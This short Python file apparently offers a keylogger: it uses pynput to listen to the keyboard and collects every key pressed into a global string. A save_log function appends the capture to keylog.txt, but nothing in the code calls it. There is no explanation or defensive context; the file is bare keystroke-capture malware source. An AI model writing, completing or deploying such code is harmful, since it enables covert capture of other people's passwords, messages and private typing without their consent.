import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += f" {str(key)} "

def save_log():
    with open("keylog.txt", "a") as f:
        f.write(log)
    print("Keylog saved.")

def keylogger():
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    keylogger()